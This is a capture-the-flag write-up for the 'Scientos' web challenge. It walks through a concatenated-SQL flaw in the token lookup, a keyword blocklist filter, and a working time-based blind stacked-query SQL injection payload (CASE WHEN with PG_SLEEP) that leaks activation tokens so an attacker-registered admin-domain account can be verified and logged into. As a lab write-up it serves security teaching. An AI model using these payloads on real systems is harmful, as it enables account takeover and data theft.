🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# Web - Scientos

## TL;DR

`ScientosNet` is a fake social network for scientists. The flag is displayed on the home
page only for accounts whose email ends with `@scientos-admin.net` and which are
**verified**. Account verification relies on a token (UUID) sent by email, but the SQL
query that fetches this token concatenates the email **without escaping it**.

By bypassing the anti-injection blacklist with a `CASE WHEN ... THEN PG_SLEEP(1)
ELSE PG_SLEEP(0) END` payload, we exfiltrate the activation token character by character
via a **time-based blind SQL injection (stacked queries)**, activate any
`@scientos-admin.net` account, then log in to retrieve the flag.

## Architecture

The challenge is made up of 4 services (`docker-compose.yml`):

- **web** (Express / EJS, port 3002): the main site, registration / login / home page with the flag
- **mailer** (port 3001): simulates an internal mailbox accessible from `/mailer`
- **proxy** (nginx): reverse proxy exposing `web` and `mailer`
- **db**: PostgreSQL 16

The source code of `web` is the only one relevant to this vulnerability.

## 1. How to get the flag

`server.js`:

```js
app.get("/", (req, res) => {
    const user = req.user;
    const isAdmin = isAdministrator(user);
    if (isAdmin) {
        return res.render("index", {user, flag});
    }
    res.render("index", {user, flag: null});
})
```

`utils.js`:

```js
export function isAdministrator(user) {
    const email = extractEmail(user?.email || "");
    return email?.endsWith("@scientos-admin.net");
}
```

`req.user` is populated from the `auth_token` JWT cookie set on login (`router.js`). So to
see the flag you need:

1. an account whose email ends with `@scientos-admin.net`;
2. that account must be **`verified = true`** (otherwise `/api/auth/login` refuses the connection);
3. to know the password of that account in order to obtain the session cookie.

Nothing prevents you from **creating such an account yourself** via `/api/auth/register`,
the only obstacle being the email verification step, which requires a secret token stored
server-side.

## 2. The flaw: SQL injection in `getToken`

`db.js`:

```js
async function getToken(email) {
    const res = await readonlyPool.query(`SELECT id
                                          FROM users
                                          WHERE email = '${email}'`);
    ...
    const res2 = await readonlyPool.query(`SELECT value
                                           FROM tokens
                                           WHERE userId = '${userId}'
                                             AND expirationDate > NOW()`);
    return res2.rows[0]?.value;
}
```

`email` is injected **raw** into the query (string concatenation), without any bound
parameter. `getToken` is called from `GET /api/auth/validate`:

```js
router.get("/validate", async (req, res) => {
    const {email, token} = req.query;
    if (!req.query || !token || !isClearString(email) || !isClearString(token)) {
        return res.redirect("/auth?status=Requête invalide&color=red");
    }
    const actualToken = await getToken(email);
    ...
});
```

A classic SQL injection via the `email` parameter of `/api/auth/validate`.

### Technical detail: why stacked queries (`; ... --`) work

`pool.query("SELECT ... '${email}'")` is called **without a parameter array**. The `pg`
driver therefore uses PostgreSQL's *simple query protocol*, which allows several
statements separated by `;` within a single query. We can thus "close" the original query
and stack an arbitrary one:

```sql
SELECT id FROM users WHERE email = 'inexistant'; <OUR QUERY> --'
```

## 3. Bypassing the `isClearString` filter

`utils.js`:

```js
const blocklistRegex = /\b(?:union|and|or)\b|\||&|\/|#/;

export function isClearString(input) {
    if (typeof input === "string") {
        return !blocklistRegex.test(input.toLowerCase());
    }
    return false;
}
```

The blacklist blocks the words `union`, `and`, `or` (as whole words) as well as
`|`, `&`, `/`, `#`. That's enough to block all "classic" injections
(`' OR 1=1 --`, `UNION SELECT ...`, `#` or `/* */` comments, etc.).

**However**, it is possible to write a boolean condition without ever using
`AND`/`OR`/`UNION`, by using a `CASE WHEN ... THEN ... ELSE ... END`, none of these
keywords being filtered:

```sql
SELECT CASE WHEN (<condition>) THEN PG_SLEEP(1) ELSE PG_SLEEP(0) END
```

For the end-of-query comment we use `--` (double dash), which is absent from the
blacklist, instead of `#` or `/* */`.

## 4. Blind exfiltration of the token (time-based blind SQLi)

The activation token is a UUID v4 (36 characters: `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`,
alphabet `0-9a-f-`). We retrieve it character by character by measuring the response time:

```sql
inexistant';
SELECT CASE WHEN
    (SUBSTRING(
        (SELECT value FROM tokens WHERE userId = (SELECT id FROM users WHERE email='<TARGET_EMAIL>') LIMIT 1),
        <position>, 1
    ) = '<tested_character>')
    THEN PG_SLEEP(1)
    ELSE PG_SLEEP(0)
END --
```

For each position (1 to 36) and each candidate character from `0123456789abcdef-`, we send
this payload via `GET /api/auth/validate?email=<payload>&token=test` and measure the
response duration:

- if it exceeds ~0.8 s, the condition is true, that's the right character;
- otherwise we move on to the next character.

In at most 36 × 17 requests, we obtain the complete activation token of any account
(by email), **without knowing the password or having access to the mailbox**.

## 5. Activating the account and logging in

Once the token has been retrieved:

1. **Register** an account with an email `xxxx@scientos-admin.net` (`POST /api/auth/register`).
2. **Exfiltrate** that account's activation token via the injection above.
3. **Validate** the account: `GET /api/auth/validate?email=<email>&token=<extracted_token>`,
   which sets `verified = true` in the database.
4. **Log in**: `POST /api/auth/login` with `email` + `password`.

### The password trap

`auth-router.js` (login):

```js
const passwordBuffer = Buffer.from(password, "hex");
const realPasswordBuffer = Buffer.from(userData.password, "hex");
if (passwordBuffer.length === realPasswordBuffer.length && timingSafeEqual(passwordBuffer, realPasswordBuffer)) {
```

One might think (as a comment in an early version of the script suggested) that the
password is hashed server-side and that one needs to send a SHA-256. **This is wrong**:
`createUser` (`db.js`) stores the password **as-is**, with no hashing whatsoever:

```js
async function createUser(email, username, password) {
    await createUserWithId(availableUserId++, email, username, password);
}
```

The `Buffer.from(x, "hex")` on both sides is only there to compare two hexadecimal
strings in constant time (`timingSafeEqual`), **not** to verify a hash. So all you have to
do is pick a password at registration that is itself valid hexadecimal (e.g. `aabbccdd`)
and send back **exactly the same string** at login. Sending a SHA-256 (64 hex characters =
32 bytes) fails because its decoded length (32) doesn't match that of the stored password
(4 bytes for `aabbccdd`), and the `passwordBuffer.length === realPasswordBuffer.length`
comparison fails before `timingSafeEqual` is even reached.

5. The server then sets an `auth_token` cookie (HS256-signed JWT), `req.user` gets
   populated, `isAdministrator` returns `true`, and `GET /` displays the flag.
